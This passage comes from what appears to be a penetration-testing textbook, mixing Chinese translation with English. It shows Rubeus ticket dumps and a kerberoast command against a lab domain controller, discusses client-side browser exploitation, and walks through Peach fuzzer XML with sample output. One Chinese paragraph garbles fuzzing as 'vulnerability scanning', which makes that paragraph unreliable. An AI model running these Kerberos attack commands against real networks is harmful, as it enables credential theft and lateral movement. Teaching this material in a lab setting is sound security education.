
```
xMDExMTA4MzYyMVqnERgPMjAyMTAxMTcyMjM2MjFaqA8bDVdBU0hFUkUuTE9DQUypIjAgoAMCAQK

GTAXGwZrcmJ0Z3QbDXdhc2hlcmUubG9jYWw=

  ServiceName           :  krbtgt/washere.local

  ServiceRealm          :  WASHERE.LOCAL

  UserName              :  bogus

  UserRealm             :  WASHERE.LOCAL

  StartTime             :  1/10/2023 3:36:21 PM

  EndTime               :  1/11/2023 1:36:21 AM

  RenewTill             :  1/17/2023 3:36:21 PM

  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable

  KeyType               :  rc4_hmac

  Base64(key)           :  jn2pxBOReqmMOs6M9WxUuA==
```

-   严格来说，这并不是 Kerberoasting 攻击，而是针对域控制器的攻击，用于收集后续可用的票据。要执行 Kerberoasting 攻击，可以使用如下命令行：

```
PS C:\Users\Ric Messier\Documents> .\rubeus.exe kerberoast /user:bogus/domain:washere.local /dc:192.168.4.218

   ______        _

  (_____ \      | |

   _____) )_   _| |__  _____ _   _  ___

  |  __  /| | | |  _ \| ___ | | | |/___)

  | |  \ \| |_| | |_) ) ____| |_| |___ |

  |_|   |_|____/|____/|_____)____/(___/

  V2.2.1

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.

[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User : bogus

[*] Target Domain : washere.local

[*] Searching path 'LDAP://192.168.4.218/DC=washere,DC=local' for Kerberoastable users
```

-   此类攻击可让你获取额外凭据，从而实现在网络内部的横向移动，即使已经在网络内部有一定立足点。这可以通过恶意软件提供远程访问实现。恶意软件在 第 8 章 “恶意软件”中有所介绍，其中包括可用于提供系统远程访问的恶意软件。你也可以通过钓鱼攻击获取用户凭据，然后使用这些凭据访问系统。请记住，要运行像 `Rubeus` 这样的工具，需要在系统上拥有命令行访问权限。由于初始系统上可能没有该工具，你需要编译并将其部署到目标系统上。

## 客户端端漏洞

当然，监听服务并不是获取系统访问的唯一途径，甚至不一定是最佳途径。这取决于攻击者想要什么。攻击者可能在寻找计算资源或网络资源。这意味着只要有系统可用即可，通常桌面系统比服务器更多。用户也是进入系统的相对容易的路径。这需要客户端漏洞，即存在于桌面但不对外直接暴露的漏洞。例如，邮件客户端可能存在漏洞。攻击者可以通过向受害者发送邮件触发该漏洞，而不是直接探测桌面系统的外部。受害者在客户端系统上打开邮件，漏洞被触发，攻击者即获取系统访问。

Web 浏览器是便捷的攻击向量，原因有多方面。其一是它们是使用最广泛的应用程序之一。并非每个人都使用像 Outlook 或 Thunderbird 这类邮件客户端，虽然这些客户端曾经非常普遍。许多人使用 Web 浏览器访问邮件。浏览器用于许多其他常用功能，以至于它们可能是某些人唯一使用的应用。例如，Chrome OS 及其运行的 Chromebook 就是以浏览器作为用户界面。Chrome OS 初始是一个轻量级 Web 客户端，大多数应用都在浏览器上下文中运行。

另一个使浏览器成为良好目标的因素是其使用范围相对集中。来自不同数据来源的统计显示，Chrome 远为占主导地位的浏览器。其次是 Internet Explorer、Firefox、Safari 和 Edge 等浏览器，但远不及 Chrome。因此，如果你能找到影响 Windows 上 Chrome 的漏洞，你将大获成功。然而，Google 在发现和修复漏洞方面极为严谨，Metasploit 中并没有针对 Chrome 的模块。不过，其他浏览器有相应的模块。例如，macOS 上的 Firefox 存在漏洞，可在 `msfconsole` 中加载该模块。

**Firefox Exploit Module in `msfconsole`**

-   使用 [`Codenomicon`](https://example.org/codenomicon) 漏洞扫描工具是一种在软件中查找错误并可能导致拒绝服务攻击的技术。它是一种简写，用于描述向应用程序发送意外或损坏数据的过程，以观察该应用程序如何处理这些数据。如果应用程序处理得当，则不会发生任何有趣的情况。你可能会得到错误，或数据仅仅被丢弃。对于我们的目的，这并不十分有意思。如果应用程序处理不佳，应用程序可能会崩溃。

    这也是一种在一段时间内流行的技术，但可能已经稍微淡出了。曾经有很多进行漏洞扫描的项目，其中一些已经不存在了，或者不再维护。有些已经变成了商业工具。最早的漏洞扫描工具来自一个学术项目，名为 `Codenomicon`，它用于识别 DNS 和 SNMP 中的严重漏洞。此后，向应用程序发送损坏数据被认为是更严格测试软件的良好方法。如今，软件开发团队在测试这些异常情况方面做得更好，这可能解释了为什么现在没有那么多项目在进行漏洞扫描。

On top of that, `fuzzing` is hard work. It's not as simple as just running a program that goes off and finds vulnerabilities and exploits. First, even finding a vulnerability is hard. If you can find one of those, there is no guarantee it will translate to an exploit. Let's say you are going to run a fuzzer against an application. If the application crashes, what do you know? You know you crashed an application. Without a lot of monitoring and instrumentation, you don't know where in the application it crashed. You may not even know very well what message caused the crash. The weird thing about software is you may get a cumulative effect. A series of messages may cause a problem that may appear as though a single message caused the failure. Narrowing down the set of messages is hard work.

Having said all that, there are some tools available that you can use for fuzzing. There is an older tool called `Sulley`, named for the fuzzy character from Monsters, Inc. (presumably because Mike didn't have the same ring), that stopped being developed and then was picked up again and updated. It's now in a state that may require a little work to get functional, but you could look at it. The one we will look at here is called `Peach` (get it? peach? fuzz?). This is a tool that can handle both network as well as file fuzzing. It takes care of the instrumentation aspect by allowing you to start up a monitor device.

`Peach` uses XML as a definition language. To write a fuzzing test in `Peach`, you have to create a number of elements. First, you need to create a data model. This defines the data that will be sent into the application. You may have multiple data models. The data models tell `Peach` what parts will be manipulated to send bad data into the application. Once you have your data model(s) defined, you need to create a state model. This tells `Peach` how the data models will be used. The following is a simple example of creating a data model and associated state model for `Peach` that will fuzz an HTTP request.

```
<DataModel name="HttpRequest">

         <String value="GET "/>

         <String value="/"/>

         <String value="HTTP/1.1\r\n"/>

         <String value="Host: "/>

         <String value="127.0.0.1"/>

</DataModel>

<StateModel name="TheStateModel" initialState="TheState">

         <State name="TheState">

                  <Action type="output">

                           <DataModel ref="HttpRequest"/>

                  </Action>

         </State>

</StateModel>
```

These alone are not sufficient. You need a publisher. This tells `Peach` how it's going to communicate with the application. In this case, you would use a network publisher, and `Peach` includes some predefined publishers for network communication. The following is the XML that defines the overall test for `Peach`, including the publisher. It also defines a logger, so we have evidence of what happened. Watching the output on the screen can be challenging since you may get a lot of output and it's hard to follow. What you can see commented out in this is the remote agent, which is used to monitor the application. In this case, we'd monitor the HTTP server for crashes. This lets `Peach` know how to communicate with the remote monitoring application so it can sync up what it sent with what happened on the remote server.

```
<Test name="Default">

         <!-- <Agent ref="RemoteAgent"/> -->

         <StateModel ref="TheStateModel"/>

         <Publisher class="TcpClient">

                  <Param name="Host" value="192.168.4.1"/>

                  <Param name="Port" value="80"/>

         </Publisher>

         <Logger class="File system">

                  <Param name="Path" value="Logs"/>

         </Logger>

</Test>
```

As noted, you get a lot of output. `Peach` will determine how many tests it runs based on the data models defined. The following is a set of output from `Peach` running the test defined earlier:

```
PS C:\Users\Ric Messier\Downloads\peach> .\peach.exe .\samples\http.xml

[[ Peach v3.1.124.0

[[ Copyright (c) Michael Eddington

[*] Test 'Default' starting with random seed 43275.

[R1,-,-] Performing iteration

[1,-,-] Performing iteration

[*] Fuzzing: HttpRequest.DataElement_1

[*] Mutator: UnicodeBomMutator

[*] Fuzzing: HttpRequest.DataElement_0

[*] Mutator: DataElementRemoveMutator

[*] Fuzzing: HttpRequest.DataElement_2

[*] Mutator: UnicodeBomMutator

[*] Fuzzing: HttpRequest.DataElement_3

[*] Mutator: UnicodeBomMutator

[2,-,-] Performing iteration

[*] Fuzzing: HttpRequest.DataElement_1

[*] Mutator: UnicodeBadUtf8Mutator

[*] Fuzzing: HttpRequest.DataElement_3

[*] Mutator: UnicodeUtf8ThreeCharMutator

[3,-,-] Performing iteration

[*] Fuzzing: HttpRequest.DataElement_1

[*] Mutator: UnicodeUtf8ThreeCharMutator

[*] Fuzzing: HttpRequest.DataElement_3

[*] Mutator: StringMutator

[*] Fuzzing: HttpRequest.DataElement_4

[*] Mutator: UnicodeBadUtf8Mutator

[*] Fuzzing: HttpRequest.DataElement_0

[*] Mutator: StringMutator

[*] Fuzzing: HttpRequest.DataElement_2

[*] Mutator: UnicodeUtf8ThreeCharMutator
```
